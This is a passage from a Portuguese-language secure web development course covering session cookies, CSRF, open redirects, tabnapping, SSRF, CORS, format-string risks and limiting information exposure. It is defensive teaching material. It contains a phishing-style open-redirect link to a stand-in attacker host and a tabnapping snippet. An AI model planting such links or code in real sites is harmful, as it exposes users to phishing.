fazer. Incluir um ID de sessão em um cookie <em>não</em> é a única maneira de usar cookies para dar suporte ao login, mas é uma abordagem comum.</p> <p>Normalmente, ao desenvolver aplicações web, você usará um framework ou biblioteca que (na maioria das vezes) gerencia as sessões de login para você. Isso é normal, basta verificar se é seguro. Aqui, abordaremos alguns recursos importantes a serem observados. Em alguns casos, seu framework não fará isso sozinho, mas você pode tomar algumas medidas adicionais para que isso aconteça.</p> <p>Primeiro, se o seu framework usa IDs de sessão em cookies (uma abordagem comum), é fundamental que a implementação não permita que invasores adivinhem ou descubram os IDs de sessão. Se um invasor conseguir obter o ID de sessão, poderá agir com os mesmos privilégios que o usuário logado! Nesse caso comum, verifique pelo menos estes fatores-chave:</p> <ul> <li>O identificador de sessão deve ter pelo menos 128 bits de dados aleatórios.</li> <li>O ID da sessão deve ser criado usando um gerador de números pseudoaleatórios <em>criptograficamente seguro (CSPRNG). Qualquer coisa que possa ser adivinhada (como</em> <strong>"adicionar um ao último ID da sessão"</strong> ou <em>"chamada comum a <strong>random()</strong></em> ") não é aceitável. Discutiremos isso com mais detalhes posteriormente.</li> <li>Criptografe os IDs de sessão entre o servidor web e o navegador. A solução usual é definir o sinalizador <strong>Seguro</strong> do cookie e sempre se comunicar usando HTTPS (TLS).</li> </ul> <p>Em segundo lugar, defina os atributos dos cookies que contêm IDs de sessão para serem seguros:</p> <ul> <li>Conforme observado anteriormente, sempre que possível, defina cookies para o processamento de sessões de login com o sinalizador <strong>HttpOnly</strong> . Dessa forma, programas JavaScript não terão acesso direto a elas. Este é outro exemplo de privilégio mínimo; se um privilégio não for necessário, não conceda o acesso.</li> <li>Da mesma forma, considere usar <em>cookies de sessão</em> (cookies sem tempo de expiração) para cookies que armazenam informações sobre sessões de login. Você não precisa fazer isso; você pode usar cookies permanentes para armazenar informações de sessão. Mas, se você usar cookies permanentes, considere limitar o tempo para, no máximo, alguns dias. Cookies permanentes são armazenados em um armazenamento permanente, e um invasor pode obter acesso a essas informações armazenadas.</li> </ul> <p>Terceiro, certifique-se de que você tenha funções de login e logout, e que elas realmente funcionem corretamente!</p> <p>Sempre que um usuário efetuar login com sucesso, certifique-se de que ele <em>sempre</em> receba um <em>novo</em> ID de sessão (normalmente retornado em um cookie). Em particular, o lado receptor de um login <em>nunca</em> deve reutilizar valores de sessão. Um novo login significa que uma nova sessão está sendo solicitada (mesmo que já exista uma sessão atual), portanto, certifique-se de que uma nova sessão seja criada e usada para essa solicitação! Se o seu programa não conseguir criar uma nova sessão para um novo login, ele poderá estar vulnerável a um <em>ataque de fixação de sessão</em> .</p> <p>Da mesma forma, <em>certifique-se</em> de fornecer aos usuários uma ação de "logoff" ("sair") que <em>realmente funcione</em> . Se você usar IDs de sessão — uma abordagem comum —, um logoff deve invalidar essa sessão. Isso geralmente significa que você precisa remover o registro desse ID de sessão do banco de dados do servidor que registra os IDs de sessão ativos (e o ID de usuário ao qual cada ID de sessão se aplica). Você também precisa informar ao navegador para excluir o cookie ou, pelo menos, o valor do ID de sessão nesse cookie. Dessa forma, o usuário é efetivamente desconectado. Os usuários efetuam logout para reduzir seus riscos, mas isso não funciona se o aplicativo não os desconectar. Um número surpreendentemente grande de sites importantes, em um momento ou outro, não desconectou usuários quando eles solicitaram.</p> <p>Você também deve, eventualmente, desconectar automaticamente uma sessão inativa. Algumas maneiras fáceis de fazer isso são não definir uma data de expiração (para que o usuário efetue o logout ao fechar o navegador) ou definir uma data de expiração para o usuário ser desconectado. Frameworks geralmente permitem que você configure isso facilmente.</p> <h2 id=csrf-xsrf>CSRF / XSRF<a class=headerlink href=#csrf-xsrf title="Permanent link">¶</a></h2> <p>Outro tipo de ataque ao qual sites são frequentemente vulneráveis ​​é chamado de falsificação de solicitação entre sites (CSRF ou XSRF). É um problema menor hoje em dia, mas ainda pode acontecer, então vamos aprender o que é e como pode ser combatido. O CSRF também é um ótimo exemplo de como vulnerabilidades de segurança específicas podem se tornar menos comuns com o tempo; se possível, tente encontrar maneiras gerais de eliminar outros tipos de vulnerabilidades!</p> <p>Em um ataque CSRF, um invasor engana o usuário, fazendo-o enviar dados para um <em>servidor</em> , onde o servidor interpreta a solicitação como uma solicitação do usuário e age diretamente sobre ela. Por exemplo, o invasor pode criar um formulário com um botão de envio no site do invasor, mas instruir o navegador do usuário a enviar o formulário preenchido para um servidor que agirá nesse formulário. Observe que, se o usuário estiver conectado a esse servidor (por exemplo, em um banco), o servidor verá que o usuário realmente está conectado ao banco e pode ser convencido a fazer algo que o usuário não pretendia (como transferir muito dinheiro para o invasor).</p> <p>De certa forma, um ataque CSRF é o oposto de um ataque XSS. O XSS explora a confiança do usuário em um servidor; o CSRF explora a confiança do servidor em um cliente (de que o usuário está, na verdade, fazendo uma determinada solicitação intencionalmente). Em outras palavras: o XSS engana os clientes; o CSRF engana os servidores.</p> <p>Uma contramedida comum usada hoje na maioria dos frameworks de aplicações web amplamente utilizados é enviar um token CSRF secreto específico do usuário em todos os formulários e em quaisquer outras URLs com efeitos colaterais e, em seguida, verificar se o segredo correto está incluído em qualquer solicitação com efeito colateral. Como os invasores não saberão o valor do segredo, eles não poderão inserir um token CSRF correspondente. Como isso está incorporado em quase todos os frameworks web amplamente utilizados hoje em dia, muitos aplicativos são protegidos automaticamente contra CSRF (a menos que desabilitem a proteção ou não utilizem o framework corretamente). Você deve preferir um framework de aplicação web que tenha um mecanismo de token CSRF.</p> <p>Outra contramedida comum usada hoje são os chamados cookies <strong>SameSite</strong> . Historicamente, todos os cookies eram enviados a um servidor sempre que o usuário tivesse cookies correspondentes para esse servidor, mesmo quando a página principal exibida fosse de um servidor diferente. Por exemplo, uma página da web no site BB pode incluir uma referência a uma imagem no site CC; quando o navegador da web baixava a imagem do CC, ele enviava todos os cookies relacionados. No entanto, isso não faz muito sentido; em muitos casos, os cookies não devem ser enviados se a interação foi causada por um servidor não relacionado. Portanto, os navegadores modernos têm uma configuração <strong>SameSite opcional em cookies. Se a configuração for</strong> <strong>Lax</strong> ou <strong>Strict</strong> , uma solicitação causada por um invasor em um servidor diferente não fará com que o cookie (como uma sessão) seja enviado. Portanto, enquanto seus cookies de sessão tiverem uma configuração <strong>SameSite de</strong> <strong>Lax</strong> ou <strong>Strict</strong> , os ataques CSRF geralmente não funcionam. Melhor ainda, os navegadores modernos estão trabalhando para tornar <strong>SameSite=Lax</strong> o padrão. É melhor definir <strong>o SameSite</strong> como <strong>Lax</strong> ou <strong>Strict</strong> , mas um padrão seguro ainda é uma boa opção.</p> <p>Em suma, as vulnerabilidades CSRF estão se tornando menos comuns porque a indústria está migrando para padrões seguros. Isso mostra que é <em>possível</em> reduzir a probabilidade de classes inteiras de vulnerabilidades projetando ou modificando sistemas para que o padrão seja seguro. Sempre que possível, incorpore contramedidas em suas ferramentas/padrões/sistema para que o problema não ocorra. Se você estiver construindo uma nova aplicação web, é muito menos provável que seja um problema, mas certifique-se de que sua estrutura web o combata e que você utilize seus mecanismos corretamente.</p> <p>É claro que existem outras maneiras pelas quais um invasor pode obter controle temporário sobre o sistema de um usuário. Portanto, você ainda pode querer implementar algumas outras contramedidas tradicionais de CSRF, como:</p> <ul> <li>Desconecte usuários automaticamente após algum período de tempo ou algum tempo de inatividade.</li> <li>Se uma ação for especialmente perigosa (por exemplo, exclusão de conta ou movimentação de uma grande quantia em dinheiro), exija uma confirmação autenticada adicional separada de que o usuário realmente a está solicitando. Isso é bom de qualquer forma, pois há muitas maneiras pelas quais um invasor pode obter controle temporário sobre uma conta; limitar o impacto faz parte do gerenciamento de riscos.</li> </ul> <h2 id=abrir-redirecionamentos-e-encaminhamentos>Abrir redirecionamentos e encaminhamentos<a class=headerlink href=#abrir-redirecionamentos-e-encaminhamentos title="Permanent link">¶</a></h2> <p>Uma aplicação web não deve aceitar entradas controladas pelo usuário que especifiquem um link para um site em um servidor diferente e, então, sem controles rigorosos, usar esse link para fazer um redirecionamento. Uma aplicação web que faz isso tem um <em>redirecionamento aberto</em> .</p> <p>Isso pode ser difícil de entender, então vejamos um exemplo. Imagine que uma aplicação web do lado do servidor tenha um link <strong>"/redirect" que aceita um parâmetro</strong> <strong>url=</strong> e, em seguida, simplesmente redireciona as solicitações para o <strong>valor url=</strong> . Isso significa que um invasor poderia criar um arquivo HTML em qualquer lugar com a seguinte aparência (o exemplo é baseado no texto do MITRE sobre <a href=https://cwe.mitre.org/data/definitions/601.html>CWE-601</a> ):</p> <p><code>&lt;a h‌ref="ht‌‌tps://bank.example.com/redirect?url=ht‌‌tps://attacker.example.net"&gt;Clique aqui para fazer login&lt;/a&gt;</code></p> <p>Qual é o problema? O problema é que um usuário que verificasse o link pensaria que este link levava a um domínio confiável (por exemplo, <strong>bank.example.com</strong> ).</p> <p>Embora tecnicamente isso seja verdade, quando clicado, o domínio supostamente confiável redirecionará silenciosamente o usuário para algum outro domínio que pode ser perigoso e não o que o usuário esperava (por exemplo, <strong>attacker.example.net</strong> ).</p> <p>De forma mais geral, o problema é que um redirecionamento aberto pode ser usado para enganar humanos e criar ataques de phishing mais fortes. Humanos podem ser induzidos a pensar que estão indo para um domínio confiável, sem perceber que, na verdade, serão imediatamente transferidos para um domínio não confiável. Em teoria, os usuários também deveriam verificar <em>onde estão agora</em> em cada página, mas humanos ocupados geralmente não fazem isso.</p> <p>Queremos tornar mais difícil, não mais fácil, enganar humanos ocupados.</p> <p>Um problema relacionado é o "encaminhamento", em que o aplicativo web encaminha a solicitação para outra parte do aplicativo.</p> <p>O aplicativo web pode interpretar incorretamente a solicitação como uma solicitação <em>interna</em> do próprio aplicativo, em vez de, mais precisamente, vir de um usuário externo, e conceder a ele privilégios indevidos.</p> <p>O <a href=https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html>guia do OWASP sobre redirecionamentos e encaminhamentos não validados</a> discute várias possíveis contramedidas:</p> <ul> <li><em>"Simplesmente evite usar redirecionamentos e encaminhamentos.</em></li> <li><em>Se usado, não permita a URL como entrada do usuário para o destino.</em></li> <li><em>Sempre que possível, peça ao usuário que forneça um nome curto, ID ou token que seja mapeado no lado do servidor para um URL de destino completo.</em><ul> <li><em>Isso fornece o mais alto grau de proteção contra ataques de adulteração de URL.</em></li> <li><em>Tenha cuidado para que isso não introduza uma vulnerabilidade de enumeração onde um usuário poderia percorrer IDs para encontrar todos os possíveis alvos de redirecionamento.</em></li> </ul> </li> <li><em>Se a entrada do usuário não puder ser evitada, certifique-se de que o valor fornecido seja válido, apropriado para o aplicativo e autorizado para o usuário.</em></li> <li><em>Limpe a entrada criando uma lista de URLs confiáveis ​​(listas de hosts ou uma regex).</em><ul> <li><em>Isso deve ser baseado em uma abordagem de lista de permissões, e não de lista de negação."</em></li> </ul> </li> </ul> <h1 id=alvo-html-e-janela-javascriptopen>Alvo HTML e janela JavaScript.open()<a class=headerlink href=#alvo-html-e-janela-javascriptopen title="Permanent link">¶</a></h1> <p>Há um problema peculiar com alguns usos especiais do atributo <strong>target</strong> do HTML e <strong>do window.open</strong> do JavaScript que muitos desenvolvedores web desconhecem. Vamos explicar o problema e algumas soluções.</p> <p>Em HTML, <code>&lt;a href=...&gt;</code> cria um hiperlink. A construção HTML <code>&lt;a href=... target=...&gt;</code> cria um hiperlink onde, ao clicar nele, é criado um novo "alvo". Usar <code>target="_blank"</code> cria o alvo em uma nova aba. Historicamente, definir <code>target="_blank"</code> poderia ser uma vulnerabilidade, mas a <a href=https://html.spec.whatwg.org/#following-hyperlinks>especificação HTML foi modificada para que <strong>_blank</strong> não seja mais um problema</a> e os navegadores modernos implementem essa correção.</p> <p>No entanto, há um caso especial com o qual você ainda precisa se preocupar. Se você fizer <em>tudo</em> isso ao mesmo tempo, poderá ter um problema de segurança:</p> <ol> <li>Use a tag HTML "a" com um alvo nomeado ou use JavaScript <strong>window.open()</strong> com um alvo nomeado <em>e</em></li> <li>A nova página que está sendo carregada é de algum (outro) sistema no qual você não confia totalmente, <em>e</em></li> <li>O alvo nomeado é algo <em>diferente</em> dos valores seguros <strong>_self</strong> (o padrão para a tag a do HTML), <strong>_blank (o padrão para</strong> <strong>window.open()</strong> do JavaScript ), <strong>_parent</strong> ou <strong>_top</strong> .</li> </ol> <p>Sempre que possível, ao carregar páginas de outros sites, não use alvos nomeados (exceto os seguros listados acima). Se você realmente precisar usar essa circunstância incomum, corrija-a em HTML adicionando <strong>rel="noopener"</strong> à tag "a".</p> <p>Explicar por que essa combinação estranha é um problema de segurança é complicado. O problema subjacente é que os navegadores precisam suportar sistemas legados. Fundamentalmente, quando há um alvo nomeado, o navegador reutiliza uma janela existente com esse nome ou cria uma, caso não haja nenhuma. O navegador então fornece a essa janela um valor "abridor" definido para seu solicitante. Esse era um padrão comum para sites mais antigos implementarem pop-ups. Essa abordagem é adequada se a janela nomeada for confiável para o solicitante. No entanto, isso fornece um mecanismo para a página mais recente manipular a página web de seu chamador. Isso permite, por exemplo, o "tabnapping", em que o novo site engana o usuário controlando outra guia. Se nenhuma contramedida for tomada, a página receptora pode fazer coisas como forçar a página <em>chamadora</em> a navegar para uma página diferente (por exemplo, <strong>window.opener.location.href = newURL</strong> ), fornecer uma nova página que se pareça com a antiga (mesmo que esteja em um local diferente) e enganar o usuário para que ele faça algo na "mesma" página que não é a mesma.</p> <p>Este costumava ser um problema mais comum, pois em algum momento também afetava <strong>_blank</strong> . Hoje, os navegadores adicionam automaticamente <strong>rel="noopener"</strong> quando <strong>_blank</strong> é o alvo. Os outros alvos nomeados "seguros" (listados acima) são da mesma origem, então, novamente, o problema não pode ocorrer. Mas se você usar um desses casos menos comuns, você mesmo terá que lidar com isso.</p> <p>Você pode encontrar alguns documentos mais antigos recomendando o uso de <strong>rel="noreferrer"</strong> . Você não precisa mais fazer isso, desde que não altere o valor de referência padrão do navegador. Os navegadores modernos agora têm, por padrão, a configuração "strict-origin-when-cross-origin"; isso significa que, quando uma origem diferente é carregada, a nova origem vê o domínio, mas <em>não</em> o caminho ou outros detalhes sobre a página que o usuário estava visualizando anteriormente. Contanto que você esteja satisfeito com esse padrão, ou defina um ainda mais rigoroso, tudo bem. No entanto, se você definir um valor mais flexível (e tenha cuidado antes de fazer isso), <strong>rel="noreferrer"</strong> impedirá que essas informações detalhadas cheguem ao outro site nesse caso específico. Você pode combinar <strong>noopener</strong> e <strong>noreferrer</strong> como <strong>rel="noopener noreferrer"</strong> . Em geral, você deve tentar usar padrões seguros em vez de tentar definir um valor seguro separadamente para cada uso.</p> <p>Uma discussão histórica desses problemas, antes da alteração dos padrões, pode ser encontrada em <em><a href=https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547>Security Vulnerability and Browser Performance Impact of Target="_blank"</a></em> por Darren Sim, 2019.</p> <h1 id=uso-de-urls-inadequadamente-verificadasfalsificacao-de-solicitacao-do-lado-do-servidor-ssrf>Uso de URLs inadequadamente verificadas/falsificação de solicitação do lado do servidor (SSRF)<a class=headerlink href=#uso-de-urls-inadequadamente-verificadasfalsificacao-de-solicitacao-do-lado-do-servidor-ssrf title="Permanent link">¶</a></h1> <p>Um Localizador Uniforme de Recursos (URL) é uma forma de se referir a um recurso web específico por localização. Tecnicamente, um URL é um tipo específico de Identificador Uniforme de Recursos (URI), mas, para os nossos propósitos, usaremos os termos de forma intercambiável. Conforme especificado na <a href=https://tools.ietf.org/html/rfc3986>IETF RFC 3986</a> , um URI genérico tem a seguinte sintaxe:</p> <p><strong>scheme:[//authority]path[?query][#fragment]</strong></p> <p>E <strong>autoridade</strong> tem esta sintaxe: <strong>[userinfo@]host[:port]</strong></p> <p>Às vezes, usuários não confiáveis ​​fornecem dados que você deseja usar como URL (ou transformar em URL) para solicitar mais informações. No entanto, isso pode ser perigoso. Se você incluir uma URL nos dados apresentados a um usuário, ele pode fazer o equivalente a clicar nela. Acontece que URLs são coisas poderosas, e um invasor pode tentar explorar qualquer um de seus recursos. Por exemplo:</p> <ul> <li>Uma URL não precisa usar o esquema <strong>https:</strong> ; ela pode ter outros esquemas, como <strong>file:</strong> (para recuperar um arquivo local), ou até mesmo esquemas relativamente obscuros, como <strong>gopher:</strong> . Um ataque furtivo é solicitar um esquema (como <strong>gopher:</strong> ) a um serviço que espera um protocolo completamente diferente; um invasor pode usar essa confusão para realizar um ataque.</li> <li>O "host" pode não ser o que você espera; o host pode se referir a um outro computador arbitrário ou até mesmo ao computador solicitante.</li> <li>Um invasor pode fornecer <strong>informações de usuário</strong> (um nome de conta de usuário) e/ou uma porta. A porta, por exemplo, permite que uma URL solicite uma conexão em <em>qualquer</em> porta de um computador.</li> <li>Uma URL pode até codificar uma variedade de caracteres para qualquer um desses dados.</li> </ul> <p>Se um servidor for enganado e solicitar uma URL verificada inadequadamente, isso é chamado de <em>falsificação de solicitação do lado do servidor</em> (SSRF).</p> <p>A principal solução é garantir que você limite bastante a forma como constrói quaisquer URLs solicitadas. Se possível, não use dados não confiáveis ​​para criar essas URLs. Se você precisar usar dados não confiáveis ​​para construir uma URL (e isso ocorre com frequência), limite ao máximo as URLs que podem ser construídas e garanta que apenas URLs <em>seguras</em> possam ser construídas. Por exemplo, em muitos casos hoje em dia, você pode limitar a URL a um único esquema ( <strong>https:)</strong> , e geralmente não há necessidade de permitir (por exemplo) portas ou nomes de usuário.</p> <h2 id=politica-de-mesma-origem-e-compartilhamento-de-recursos-de-origem-cruzada-cors-cross-origin-resource-sharing>Política de Mesma Origem e Compartilhamento de Recursos de Origem Cruzada (CORS -Cross-Origin Resource Sharing)<a class=headerlink href=#politica-de-mesma-origem-e-compartilhamento-de-recursos-de-origem-cruzada-cors-cross-origin-resource-sharing title="Permanent link">¶</a></h2> <p>Quando um navegador recebe um arquivo HTML, este pode referenciar livremente imagens, vídeos, folhas de estilo CSS e scripts para execução.</p> <p>Normalmente, o navegador tentará recuperá-los e utilizá-los, independentemente do site de origem desses materiais.</p> <p>No entanto, quando um navegador recupera e executa um script (como JavaScript), seria perigoso para o navegador permitir que esse script interagisse facilmente com sites arbitrários.</p> <p>Se isso fosse permitido, um script malicioso poderia enviar secretamente dados privados para qualquer outro site, e o script também poderia atacar outros sites (por exemplo, explorando vulnerabilidades ou lançando um ataque DDoS).</p> <p>Para evitar muitos problemas de segurança, os navegadores da web normalmente impõem aos programas JavaScript do lado do cliente um conjunto de regras chamado <em>política de mesma origem</em> .</p> <p>Sob a política de mesma origem, os programas JavaScript do lado do cliente só podem interagir com a mesma <em>origem</em> , incluindo a visualização de quaisquer recursos. A origem de uma URL é a combinação do protocolo (geralmente https), porta (443 por padrão para https) e host.</p> <p>Assim, <strong>ht‌tps://example.com/foo</strong> e <strong>ht‌tps://example.com/bar</strong> são considerados como tendo a mesma origem porque eles têm a combinação (https, 443, example.com). O propósito da política de mesma origem é isolar documentos potencialmente maliciosos (Mozilla, <em><a href=https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>Política de mesma origem</a></em> ).</p> <p>A política de mesma origem previne muitos problemas de segurança, mas às vezes é muito rigorosa. Um site pode permitir especificamente a interação por JavaScript de outras origens usando o Compartilhamento de Recursos entre Origens (CORS).</p> <p>O CORS pode ser útil, pois flexibiliza as restrições da política de mesma origem. O CORS também pode ser um problema, pois pode permitir vulnerabilidades se for mal utilizado. O CORS é especificado em detalhes na <a href=https://fetch.spec.whatwg.org/#http-extensions>especificação WHATWG Fetch</a> . A Mozilla tem uma boa descrição do CORS em sua <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS>documentação</a> . Nesta unidade, abordaremos brevemente os destaques, resumindo parte do material da documentação do Mozilla CORS.</p> <p>Em resumo: O CORS permite que servidores web declarem quais outras origens têm acesso a quais recursos (URLs) e quais verbos HTTP ( <strong>GET</strong> , <strong>POST</strong> , <strong>DELETE</strong> , etc.) são permitidos para essas outras origens. Os navegadores web solicitam essas informações e as utilizam para determinar se programas JavaScript do lado do cliente têm permissão para fazer uma solicitação entre origens (ou seja, uma ação fora de sua origem). Essas informações são trocadas usando novos cabeçalhos HTTP gerados pelo navegador e pelo servidor web. As solicitações CORS são usadas para solicitações <strong>XMLHttpRequest</strong> e <strong>Fetch entre origens (entre outras circunstâncias).</strong></p> <p>Existem dois tipos de requisições CORS: uma (chamada) <em>requisição simples</em> e uma <em>requisição preflighted</em> . Isso é uma otimização. Requisições simples usam uma única interação, enquanto requisições preflighted bem-sucedidas usam duas interações. Qualquer requisição CORS que não possa ser feita com uma requisição simples é implementada automaticamente pelo navegador da web com uma requisição preflighted. Requisições preflighted têm mais latência do que uma requisição simples, então, onde você <em>puder</em> , escreva seu código do lado do cliente para que ele use requisições CORS simples. Às vezes, isso não é possível, e então uma requisição preflighted de latência mais alta será usada automaticamente.</p> <p>Uma solicitação simples CORS é usada quando <strong>todas</strong> as seguintes condições são verdadeiras:</p> <ul> <li>O método solicitado é <strong>GET</strong> , <strong>HEAD</strong> ou <strong>POST</strong> .</li> <li>Os cabeçalhos de solicitação são apenas aqueles definidos automaticamente pelo navegador da web (também conhecido como agente do usuário), opcionalmente estendidos com <em>cabeçalhos de solicitação na lista segura do CORS</em> . Exemplos desses cabeçalhos na lista segura são <strong>Accept</strong> , <strong>Accept-Language</strong> , <strong>Content-Language</strong> , <strong>Viewport-Width</strong> e <strong>Width</strong> .</li> <li>O cabeçalho <strong>Content-Type</strong> é um dos seguintes: <strong>application/x-www-form-urlencoded, multipart/form-data</strong> ou <strong>text/plain</strong> .</li> <li>Alguns outros requisitos também são atendidos. Consulte a especificação para obter detalhes; na maioria dos casos, esses outros requisitos serão atendidos.</li> </ul> <p>Quando uma solicitação simples CORS é feita, o navegador web faz a solicitação normalmente e também define o cabeçalho HTTP <strong>Origin</strong> como a origem do script. O servidor web então determina se a solicitação é aceitável. O servidor web então responde e define o cabeçalho HTTP <strong>Access-Control-Allow-Origin</strong> com informações sobre a(s) origem(ns) permitida(s). Se esse valor for " ***** ", <em>qualquer</em> origem terá esse acesso permitido. O navegador web verifica o <strong>Access-Control-Allow-Origin</strong> e, se a origem da solicitação corresponder, o script recebe as informações retornadas.</p> <p>Uma solicitação preflight, diferentemente de uma solicitação simples, utiliza uma etapa extra. Em uma solicitação preflight, o navegador web primeiro envia uma solicitação <strong>OPTIONS</strong> com a <strong>Origem</strong> e outras informações, para perguntar ao servidor web se a solicitação real é <em>"segura para envio"</em> . Se o servidor web aprovar, a solicitação real é enviada. Alguns navegadores não seguem redirecionamentos para uma solicitação preflight; consulte a <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS>documentação do Mozilla CORS</a> para obter soluções, se for importante para você.</p> <p>Por padrão, os navegadores não enviam credenciais (cookies e informações de autenticação HTTP) em uma solicitação CORS. No entanto, um sinalizador específico pode ser definido em um objeto <strong>XMLHttpRequest</strong> ou no construtor ****Request**** para enviar credenciais. Se isso for feito, o servidor web deverá retornar <strong>Access-Control-Allow-Credentials: true</strong> ou o programa JavaScript não receberá os resultados. Os servidores web devem ser muito cautelosos ao usar essa opção; se for usada, seja muito criterioso quanto às origens permitidas. É muito mais seguro <em>não</em> usar <strong>Access-Control-Allow-Credentials</strong> , pois isso permite o controle programático credenciado de uma origem diferente.</p> <p>Se você pretende que alguma informação seja publicamente legível em seu servidor web, e ela nunca varia (independentemente de quem a solicitou ou de onde veio), considere retornar <strong>Access-Control-Allow-Origin:</strong> quando um navegador web tentar <strong>obter</strong> essa informação. Isso permite que programas JavaScript do lado do cliente recuperem diretamente essa informação e a utilizem posteriormente. Isso permite que programas JavaScript a solicitem repetidamente, o que, em teoria, facilita um pouco os ataques DDoS. No entanto, para muitos sites, o objetivo é distribuir algumas informações, e o DDoS pode ser combatido de outras maneiras.</p> <p>Às vezes, as informações podem variar dependendo da origem do solicitante (isso se aplica se você definir <strong>Access-Control-Allow-Origin</strong> com qualquer valor diferente de " ***** "). Nesses casos, certifique-se de que esse caminho sempre inclua um cabeçalho <strong>"Vary"</strong> que inclua o valor <strong>"Origin"</strong> . Esse valor <strong>"Vary"</strong> informa ao navegador que o resultado pode variar dependendo da origem, evitando que informações de uma origem vazem para outra (ou a ausência de origem) via CORS.</p> <p>Detalhes sobre como habilitar o CORS para uma ampla variedade de circunstâncias estão disponíveis em <a href=https://enable-cors.org/ >enable-cors.org</a> . Você também pode consultar os seguintes recursos para obter mais detalhes:</p> <ul> <li><a href=https://fetch.spec.whatwg.org/ >Grupo de Trabalho de Tecnologia de Aplicações de Hipertexto da Web (WHATWG). Buscar</a> .</li> <li><a href=https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>Documentação da política de mesma origem da Mozilla</a></li> <li><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS>Documentação do Cross-Origin Resource Sharing (CORS) da Mozilla</a> .</li> </ul> <h2 id=strings-de-formato-e-modelos>Strings de formato e modelos<a class=headerlink href=#strings-de-formato-e-modelos title="Permanent link">¶</a></h2> <p>Produzir resultados pode ser complicado. Quase todas as linguagens de programação possuem mecanismos especiais para facilitar a saída; até mesmo a versão original de 1956 do FORTRAN tinha ( <em><a href=https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf>The FORTRAN Automatic Coding System for the IBM 704 EDPM: Programmer's Reference Manual</a></em> , 1956)! Esses mecanismos incluem vários tipos de strings de formato e sistemas de modelos. Esses mecanismos podem ser muito poderosos e acelerar o desenvolvimento. Eles também podem ser cruciais para combater vulnerabilidades; uma das melhores maneiras de combater ataques de Cross-Site Scripting (XSS) é usar um sistema de modelos que os combata por padrão, como já discutimos.</p> <p>No entanto, <strong>tenha</strong> <strong>muito cuidado</strong> ao permitir que usuários não confiáveis ​​controlem os formatos de saída (ou seja, usando strings de formato e modelos de usuários não confiáveis). Em muitos casos, você <em>não</em> deve permitir que usuários não confiáveis ​​definam formatos de saída usados ​​por sistemas de modelos de uso geral sem validá-los cuidadosamente primeiro. Alguns sistemas de formato de saída podem executar código arbitrário ou revelar informações além de um conjunto específico de valores aprovados – e você <strong>definitivamente</strong> não deve permitir isso na maioria dos casos! Mesmo quando não podem executar código <em>arbitrário</em> , por definição, eles controlam a saída e podem criar resultados enganosos ou resultados que sobrecarreguem a saída.</p> <p>As rotinas de saída da linguagem de programação C são especialmente perigosas, pois seu design pressupõe que os parâmetros da string de formato sejam de fontes confiáveis. Por exemplo, a família de rotinas <strong>printf() (incluindo</strong> <strong>fprintf</strong> e <strong>snprintf</strong> ) recebe um parâmetro <em>de string de formato</em> ; se um invasor puder controlar a string de formato, ele poderá, trivialmente, tornar o resultado arbitrariamente longo (geralmente levando a um estouro de buffer), imprimir qualquer área da memória (revelando informações ou dados confidenciais que permitem um desvio de segurança) ou usar a operação <strong>%n</strong> para sobrescrever áreas de memória arbitrárias. O mesmo vale para <strong>syslog()</strong> (que grava informações de log do sistema) e <strong>setproctitle()</strong> (que define a string usada para exibir informações do identificador do processo). Muitas funções com nomes que começam com <strong>err</strong> ou <strong>warn</strong> , contendo <strong>log</strong> ou terminando em <strong>printf</strong> merecem ser revisadas.</p> <p>A maioria dos sistemas de formatação de outras linguagens de programação não são tão perigosos, mas ainda podem causar problemas. A melhor solução é garantir que um usuário não confiável não possa fornecer a string de formatação. Se as circunstâncias exigirem que você permita isso, <em>certifique-se</em> de que o sistema que você usa não permita uma vulnerabilidade, por exemplo, permitindo apenas tipos específicos de formatos (certifique-se de validar isso!), ou use uma biblioteca projetada especificamente para ser usada com segurança com modelos não confiáveis. Mesmo nesses casos, lembre-se de que, se um usuário puder controlar o modelo de saída, ele poderá produzir uma quantidade abundante de saída. Certifique-se de que isso não seja um problema sério (por exemplo, garantindo que apenas esse mesmo usuário veja os resultados daquele modelo, para que os invasores acabem atacando a si mesmos).</p> <p>Muitos sistemas de formatação de saída têm uma maneira de oferecer suporte à internacionalização ( <strong>i18n</strong> ) e à localização ( <strong>l10n ). O sistema</strong> <strong>gettext()</strong> amplamente utilizado , por exemplo, permite selecionar uma string (incluindo uma string de formato ou modelo) usando a localidade atual do usuário. O valor da localidade normalmente seria fornecido por um usuário não confiável. No entanto, isso é aceitável, desde que seu único efeito seja selecionar entre strings de formato ou modelos, todos os quais você sabe que pode confiar.</p> <h2 id=minimize-o-feedbackexposicao-de-informacoes>Minimize o feedback/exposição de informações<a class=headerlink href=#minimize-o-feedbackexposicao-de-informacoes title="Permanent link">¶</a></h2> <p>Evite fornecer informações de segurança ou confidenciais a usuários não confiáveis. Se uma solicitação for privilegiada, simplesmente confirme se ela foi bem-sucedida ou não, e se falhar, apenas informe que falhou e minimize as informações sobre o motivo.</p> <p>Em resumo, <strong>minimize o feedback a usuários não confiáveis</strong> ​​se isso puder comprometer a segurança e, em vez disso, envie as informações detalhadas para os logs de trilha de auditoria. Por exemplo:</p> <ul> <li>Se o seu programa exigir algum tipo de autenticação do usuário (por exemplo, se você estiver desenvolvendo um serviço de rede ou um programa de login), forneça ao usuário o mínimo de informações possível antes da autenticação. Em particular, evite revelar o número da versão do seu programa antes da autenticação. Caso contrário, se uma versão específica do seu programa apresentar uma vulnerabilidade, os usuários que não atualizarem a partir dessa versão informarão aos invasores que estão vulneráveis.</li> <li>Se o seu programa aceitar uma senha, por padrão, não mostre a senha completa enquanto ela estiver sendo inserida. No máximo, mostre o caractere inserido mais recentemente. Mostrar a senha completa enquanto ela é inserida pode permitir que outras pessoas a vejam. Em formulários HTML, defina o tipo de entrada como senha, o que limita intencionalmente o feedback. Muitas interfaces de usuário permitem que os usuários selecionem a exibição de informações confidenciais pressionando um ícone de olho; isso é aceitável, pois a exibição é feita por solicitação específica do usuário, e não por padrão.</li> <li>Em caso de falha de login, basta dizer <em>"nome de usuário ou senha falhou"</em> ou algo parecido — não exponha se foi o nome de usuário ou a senha que falhou. Isso pode indicar ao invasor que o nome de usuário é válido, facilitando ataques 